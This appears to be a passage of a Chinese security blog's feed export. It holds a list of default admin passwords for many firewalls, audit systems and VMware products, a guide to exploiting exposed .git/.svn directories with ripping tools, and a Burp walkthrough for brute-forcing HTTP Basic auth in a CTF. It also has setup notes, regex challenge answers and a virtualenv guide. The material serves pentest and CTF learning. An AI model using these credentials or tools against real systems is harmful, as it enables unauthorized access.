�0�2</li><li>联想网御：administrator/administrator</li><li>网御事件服务器：admin/admin123</li><li>联想网御防火墙PowerV：administrator/administrator</li><li>联想网御入侵检测<strong>系统</strong>：lenovo/default</li><li>网络卫士入侵检测<strong>系统</strong>：admin/talent</li><li>网御入侵检测<strong>系统</strong>V3.2.72.0：adm/leadsec32</li><li>admin：用户名leadsec32</li><li>联想网御入侵检测<strong>系统</strong>IDS：root/111111</li><li>admin：用户名：admin123</li><li>科来网络回溯分析<strong>系统</strong>：csadmin/colasoft</li><li>中控考勤机web3.0：administrator/123456</li><li>H3C iMC：admin/admin</li><li>H3C SecPath系列：admin/admin</li><li>H3C S5120-SI：test/123</li><li>H3C智能管理中心：admin/admin</li><li>H3C ER3100：admin/adminer3100</li><li>H3C ER3200：admin/adminer3200</li><li>H3C ER3260：admin/adminer3260</li><li>H3C：admin/adminer | admin/admin�0�2 | admin/h3capadmin</li><li>h3c：用户名h3c�0�2</li><li>360天擎：admin/admin</li><li>网神防火墙：firewall/firewall</li><li>天融信防火墙NGFW4000：superman/talent</li><li>黑盾防火墙：admin/admin | rule/abc123 | audit/用户名abc123</li><li>华为防火墙：telnetuser/telnetpwd</li><li>ftpuser：用户名ftppwd</li><li>方正防火墙：admin/admin</li><li>飞塔防火墙：admin/密码为空</li><li>Juniper_SSG__5防火墙：netscreen/netscreen</li><li>中新金盾硬件防火墙：admin/123</li><li>kill防火墙(冠群金辰)：admin/sys123</li><li>天清汉马USG防火墙：admin/venus.fw | Audit/venus.audit | useradmin/venus.user</li><li>阿姆瑞特防火墙：admin/manager</li><li>山石网科：hillstone/hillstone</li><li>绿盟安全审计<strong>系统</strong>：weboper/weboper | webaudit/webaudit | conadmin/conadmin | admin/admin |shell/shell</li><li>绿盟产品：密码nsfocus123 | Nsfocus_00</li><li>TopAudit日志审计<strong>系统</strong>：superman/talent</li><li>LogBase日志管理综合审计<strong>系统</strong>：admin/safetybase</li><li>网神SecFox运维安全管理与审计<strong>系统</strong>：admin/!1fw@2soc#3vpn</li><li>天融信数据库审计<strong>系统</strong>：superman/telent</li><li>Hillstone安全审计平台：hillstone/hillstone</li><li>网康日志中心：ns25000/ns25000</li><li>网络安全审计<strong>系统</strong>（中科新业）：admin/123456</li><li>天玥网络安全审计<strong>系统</strong>：Admin/cyberaudit</li><li>明御WEB应用防火墙：admin/admin | admin/adminadmin</li><li>明御攻防实验室平台：root/123456</li><li>明御安全网关：admin/adminadmin</li><li>明御运维审计与册风险控制<strong>系统</strong>：admin/1q2w3e | system/1q2w3e4r | auditor/1q2w3e4r�0�2�0�2 �0�2| operator/1q2w3e4r �0�2�0�2 �0�2</li><li>明御网站卫士：sysmanager/sysmanager888</li><li>亿邮<strong>邮件网关</strong>：eyouuser/<strong>eyou</strong>_admin | eyougw/admin@(<strong>eyou</strong>) | admin/±ccccc | admin/cyouadmin</li><li>Websense邮件安全网关：administrator/admin</li><li>梭子鱼邮件存储网关：admin/admin</li></ol><p>*<br>*</p><h3 id="VMware产品："><a href="#VMware产品：" class="headerlink" title="\VMware产品：**"></a><strong><em>\</em>VMware产品：**</strong></h3><ol><li>vCenter Application Discovery Manager：root/123456</li><li>vCenter Chargeback ：root/wmware</li><li>vCenter Infrastructure Navigator：root/Supplied during OVA deployment</li><li>vCenter Log Insight：admin/password specified during initial configuration</li><li>vCenter Web Client Configuration ：root/wmware</li><li>vCenter vSphere Web Client Access：root/wmware</li><li>vCenter Single Sign On (SSO)：root@System-Domain/specified during installation</li><li>vCenter Orchestrator Appliance:<br>Appliance Configuration：wmware/wmware<br>Orchestrator Client：vcoadmin/vcoadmin<br>Web Operator：vcoadmin/vcoadmin</li><li>vCenter Orchestrator for Windows：wmware/wmware</li><li>vCenter Operations：admin/admin</li><li>vCloud Connector Node ：admin/wmware</li><li>vCloud Connector Server: admin/vmware</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode+docker打造pwn环境</title>
      <link href="/2020/03/10/vscode-docker%E6%89%93%E9%80%A0pwn%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/03/10/vscode-docker%E6%89%93%E9%80%A0pwn%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>windows下进行</p><h3 id="安装ubuntu虚拟机"><a href="#安装ubuntu虚拟机" class="headerlink" title="安装ubuntu虚拟机"></a>安装ubuntu虚拟机</h3><p>命令行安装即可，安装完后</p><h4 id="1、换源"><a href="#1、换源" class="headerlink" title="1、换源"></a>1、换源</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line">vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>更换阿里云源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p> 更改完成之后执行以下命令 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><h4 id="2、安装开启SSH服务"><a href="#2、安装开启SSH服务" class="headerlink" title="2、安装开启SSH服务"></a>2、安装开启SSH服务</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">sudo apt-get install openssh-client</span><br><span class="line">sudo apt-get install openssh-service</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置开机启动</span></span><br><span class="line">sudo update-rc.d ssh defaults</span><br><span class="line"><span class="meta">#</span><span class="bash"> 开启服务</span></span><br><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure><p>设置root登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/ssh/sshd_config</span><br><span class="line"><span class="meta">#</span><span class="bash">将 PermitRootLogin 改为yes，并保存</span></span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure><h4 id="3、-安装docker"><a href="#3、-安装docker" class="headerlink" title="3、 安装docker"></a>3、 安装docker</h4><p><a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">参见菜鸟教程</a></p><h3 id="安装PWNDocker"><a href="#安装PWNDocker" class="headerlink" title="安装PWNDocker"></a>安装<a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">PWNDocker</a></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/pwndocker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker run -it --rm -name testctf -v $(<span class="built_in">pwd</span>):/ctf/work skysider/pwndocker</span></span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">--rm \</span><br><span class="line">-h $&#123;ctf_name&#125; \</span><br><span class="line">--name $&#123;ctf_name&#125; \</span><br><span class="line">-v $(pwd)/$&#123;ctf_name&#125;:/ctf/work \</span><br><span class="line">-p 23946:23946 \</span><br><span class="line">--cap-add=SYS_PTRACE \</span><br><span class="line">skysider/pwndocker</span><br><span class="line"></span><br><span class="line">docker exec -it $&#123;ctf_name&#125; /bin/bash</span><br></pre></td></tr></table></figure><h3 id="配置vscode"><a href="#配置vscode" class="headerlink" title="配置vscode"></a>配置vscode</h3><ul><li>安装Remote-SSH插件</li><li>ssh连接虚拟机</li><li>打开虚拟机挂载到docker的文件夹</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 生产力工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web信息泄露总结</title>
      <link href="/2020/03/09/web%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/"/>
      <url>/2020/03/09/web%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。</p><h2 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a><a href="https://www.secpulse.com/archives/tag/源码泄漏" target="_blank" rel="noopener">源码泄漏</a>分类</h2><h3 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h3><p><strong>漏洞成因：</strong></p><p>hg init的时候会生成.hg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http://www.example.com/.hg/</span><br></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://www.example.com/.hg/</span><br></pre></td></tr></table></figure><h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><p><strong>漏洞成因：</strong></p><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g. http://www.example.com/.git/config</span><br></pre></td></tr></table></figure><p><strong><a href="https://www.secpulse.com/archives/tag/漏洞利用" target="_blank" rel="noopener">漏洞利用</a>：</strong></p><p>工具：</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://www.example.com/.git/</span><br></pre></td></tr></table></figure><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-git.pl -v -u http://www.example.com/.git/</span><br></pre></td></tr></table></figure><h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><p><strong>漏洞成因:</strong></p><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了<a href="https://www.secpulse.com/archives/tag/敏感的文件名" target="_blank" rel="noopener">敏感的文件名</a>等信息。</p><p><strong>漏洞利用:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/.ds_store</span><br></pre></td></tr></table></figure><p>注意路径检查</p><p>工具：</p><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">dsstoreexp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure><h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p><strong>漏洞成因及危害:</strong></p><p>该漏洞的成因主要有以下两种：</p><ol><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li></ol><p><strong>漏洞检测:</strong></p><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure><h3 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h3><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p><p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</span><br></pre></td></tr></table></figure><p><strong>漏洞利用:</strong></p><p>工具：</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.example.com/.svn/</span><br></pre></td></tr></table></figure><p><a href="https://pan.baidu.com/s/1mrNpB" target="_blank" rel="noopener">Seay-Svn</a></p><h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主要包含一下文件或目录：</p><ul><li><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li><li><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</li><li><code>/WEB-INF/database.properties</code>：数据库配置文件</li></ul><p><strong>漏洞成因：</strong></p><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><p><strong>漏洞检测以及利用方法：</strong></p><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。<br>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p><h3 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h3><p><strong>漏洞利用</strong></p><p>测试的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息</span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure><p>取回源码的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name dir</span><br></pre></td></tr></table></figure><p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p><p>查看所有的改变的命令，转到download的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br></pre></td></tr></table></figure><h3 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h3><p>工具：</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp爆破HTTPBasic认证</title>
      <link href="/2020/03/01/Burp%E7%88%86%E7%A0%B4HTTPBasic%E8%AE%A4%E8%AF%81/"/>
      <url>/2020/03/01/Burp%E7%88%86%E7%A0%B4HTTPBasic%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP-Basic-认证"><a href="#HTTP-Basic-认证" class="headerlink" title="HTTP Basic 认证"></a>HTTP Basic 认证</h2><p>HTTP Basic 认证是简单的请求和响应机制，服务器可以通过它从客户机请求认证信息（用户标识和密码）。客户机在 Authorization 头中向服务器传递认证信息。认证信息是基本 64 位编码的。<br>下面来举个例子具体说明，假设我们请求的用户名密码均为 admin，则首先需要对用户名和密码进行 Base64 编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Base64(&apos;admin:admin&apos;) = YWRtaW46YWRtaW4=</span><br></pre></td></tr></table></figure><p>则我们的认证请求为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br></pre></td></tr></table></figure><p>客户端请求实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1  </span><br><span class="line">Host: localhost  </span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br></pre></td></tr></table></figure><p>如果认证成功，则服务器会返回 200 的响应：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK  </span><br><span class="line">Date: Sun, 05 Jun 2016 13:56:02 GMT  </span><br><span class="line">Content-Type: application/json; charset=utf-8  </span><br><span class="line">Content-Length: 53</span><br></pre></td></tr></table></figure><p>如果认证失败会返回 401 的响应：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 401 Unauthorized  </span><br><span class="line">Date: Sun, 05 Jun 2016 13:56:02 GMT  </span><br><span class="line">status: 401 Unauthorized  </span><br><span class="line">Content-Length: 53</span><br></pre></td></tr></table></figure><h2 id="使用-Burp-suite-进行爆破"><a href="#使用-Burp-suite-进行爆破" class="headerlink" title="使用 Burp suite 进行爆破"></a>使用 Burp suite 进行爆破</h2><p><strong>题目来源：CTFHUB</strong></p><p>首先同样的设置代理然后将拦截的请求发送给 Intruder，如下图所示：</p><p><img src="/images/Burp%E7%88%86%E7%A0%B4HTTPBasic%E8%AE%A4%E8%AF%81/946179040.jpg" alt="1.jpg"></p><p>随后在 Intruder 中我们选择 <code>Authorization: Basic</code> 后面那部分内容：</p><p><img src="/images/Burp%E7%88%86%E7%A0%B4HTTPBasic%E8%AE%A4%E8%AF%81/268829505.jpg" alt="2.jpg"></p><p>在 Payload 设置中类型选择 Custom iterator</p><p><img src="/images/Burp%E7%88%86%E7%A0%B4HTTPBasic%E8%AE%A4%E8%AF%81/221089016.png" alt="3.png"></p><p>我们的认证信息是类似 <code>username:password</code> 的形式，所示我们需要在 Payload 选项里设置两个 Position，每个 Position 之间使用 : 隔开。关于添加 : 有两种方式，第一种是如果你只准备爆破单个用户，那么可以直接在 Position 1 里的用户名后面直接添加上一个 :；另一种方式是当你准备同时爆破多个用户时，那么就需要在下面添加分隔符，即在 “Separator for position 1” 中添加 :。</p><p><img src="/images/Burp%E7%88%86%E7%A0%B4HTTPBasic%E8%AE%A4%E8%AF%81/2468484056.jpg" alt="4.jpg"></p><p>之后设置 Position 2 也就是我们想要爆破的密码了，我这里就直接加载本地的密码字典里：</p><p><img src="/images/Burp%E7%88%86%E7%A0%B4HTTPBasic%E8%AE%A4%E8%AF%81/369641866.jpg" alt="5.jpg"></p><p>然后就是重点了，我们要在 Payload Processing 里添加一条规则，使得 Burp suite 会自动将我们的用户名密码进行 Base64 编码。点击 add 按钮后选择 Encode 和 Base64-encode 就行了：</p><p><img src="/images/Burp%E7%88%86%E7%A0%B4HTTPBasic%E8%AE%A4%E8%AF%81/857672096.jpg" alt="6.jpg"></p><p>到这还没完，因为我们的 Base64 编码经常会以等号结尾，这里我们就需要取消页面最底下的 Payload Encoding 选项，不让 Burp suite 把我们的编码后数据中的等号在进行 URL 编码了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wechall-Training-Regex</title>
      <link href="/2020/01/05/Wechall-Training-Regex/"/>
      <url>/2020/01/05/Wechall-Training-Regex/</url>
      
        <content type="html"><![CDATA[<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>学习匹配字符串的开头和结尾:</p><p><code>/^$/</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'^' #匹配字符串的开始</span><br><span class="line">'$' #匹配字符串的结束</span><br></pre></td></tr></table></figure><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>匹配固定字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^wechall$/</span><br></pre></td></tr></table></figure><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ok, matching static strings is not the main goal of regular expressions.</span><br><span class="line">Your next task is to submit an expression that matches valid filenames for certain images.</span><br><span class="line">Your pattern shall match all images with the name wechall.ext or wechall4.ext and a valid image extension.</span><br><span class="line">Valid image extensions are .jpg, .gif, .tiff, .bmp and .png.</span><br><span class="line">Here are some examples for valid filenames: wechall4.tiff, wechall.png, wechall4.jpg, wechall.bmp</span><br></pre></td></tr></table></figure><p>匹配文件名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/^wechall4?\.(?:jpg|gif|tiff|bmp|png)$/</span><br><span class="line"># ?表示重复零次或一次</span><br><span class="line"># \. 将.进行转义</span><br><span class="line"># (?:jpg|gif|tiff|bmp|png) (?:exp)表示非捕获分组，匹配exp,不捕获匹配的文本，也不给此分组分配组号。</span><br></pre></td></tr></table></figure><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p> It is nice that we have valid images now, but could you please capture the filename, without extension, too?<br>As an example: wechall4.jpg should capture/return wechall4 in your pattern now. </p><p>捕获文件名，需要对文件名添加捕获分组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^(wechall4?)\.(?:jpg|gif|tiff|bmp|png)$/</span><br></pre></td></tr></table></figure><p><code>(wechall4?)</code>用小括号来指定子表达式(也叫做分组)，然后你就可以指定这个子表达式的重复次数了，你也可以对子表达式进行其它一些操作</p>]]></content>
      
      
      
        <tags>
            
            <tag> Wechall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python虚拟环境管理</title>
      <link href="/2020/01/05/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/"/>
      <url>/2020/01/05/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="一、使用virtualenv"><a href="#一、使用virtualenv" class="headerlink" title="一、使用virtualenv"></a>一、使用virtualenv</h2><h4 id="1-使用pip"><a href="#1-使用pip" class="headerlink" title="1. 使用pip"></a>1. 使用pip</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure><h4 id="2-创建运行环境"><a href="#2-创建运行环境" class="headerlink" title="2. 创建运行环境"></a>2. 创建运行环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">virtualenv [虚拟环境名称] </span><br><span class="line">virtualenv venv</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果不想使用系统的包,加上–no-site-packeages参数</span></span><br><span class="line">virtualenv  --no-site-packages 创建路径名</span><br></pre></td></tr></table></figure><h4 id="3-激活环境"><a href="#3-激活环境" class="headerlink" title="3. 激活环境"></a>3. 激活环境</h4><p>linux:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd venv</span><br><span class="line">$ souce ./bin/activate</span><br></pre></td></tr></table></figure><p>Windows 10:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">cd</span> venv</span><br><span class="line">&gt; .\Scripts\activate.bat</span><br></pre></td></tr></table></figure><h4 id="4-退出环境"><a href="#4-退出环境" class="headerlink" title="4. 退出环境"></a>4. 退出环境</h4><p>linux:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ deactivate</span><br></pre></td></tr></table></figure><p>Windows 10:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; .\Scripts\deactivate.bat</span><br></pre></td></tr></table></figure><h4 id="5-删除环境"><a href="#5-删除环境" class="headerlink" title="5. 删除环境"></a>5. 删除环境</h4><p>没有使用virtualenvwrapper前，可以直接删除venv文件夹来删除环境</p><h4 id="6-使用环境"><a href="#6-使用环境" class="headerlink" title="6. 使用环境"></a>6. 使用环境</h4><p>进入环境后，一切操作和正常使用python一样<br> 安装包使用<code>pip install 包</code></p><h2 id="二、使用Virtualenvwrapper"><a href="#二、使用Virtualenvwrapper" class="headerlink" 